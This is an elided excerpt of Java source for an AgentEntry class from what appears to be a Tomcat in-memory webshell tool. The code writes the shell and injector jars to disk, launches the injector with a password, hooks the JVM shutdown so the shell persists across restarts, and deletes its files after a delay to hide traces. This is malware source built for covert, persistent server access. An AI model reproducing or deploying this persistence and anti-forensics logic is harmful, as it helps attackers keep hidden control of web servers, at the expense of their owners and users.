...
public class AgentEntry {
    ...
    public static void persist() {
        try {
            Thread t = new Thread() {
                public void run() {
                    try {
                        ...
                        writeFiles("AgentTomcatMemShellInject.jar", AgentEntry.injectFileBytes);
                        writeFiles("AgentTomcatMemShell.jar", AgentEntry.agentFileBytes);
            ...
            //对JVM进程(这里指的是Tomcat进程)的关闭操作进行hook
    ...
    public static void readInjectFile(String filePath) throws Exception {
        String fileName = "AgentTomcatMemShellInject.jar";
    ...
    public static void readAgentFile(String filePath) throws Exception {
        String fileName = "AgentTomcatMemShell.jar";
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
    ...
    public static void startInject() throws Exception {
        Thread.sleep(2000);
        String tempFolder = System.getProperty("java.io.tmpdir");
        String cmd = "java -jar " + tempFolder + File.separator + "AgentTomcatMemShellInject.jar " + AgentEntry.password;
    ...
    public static void clear(String currentPath) throws Exception {
        Thread clearThread = new Thread() {
            ...
            public void run() {
                try {
                    Thread.sleep(5000);
                    String injectFile = currentPath + "AgentTomcatMemShellInject.jar";
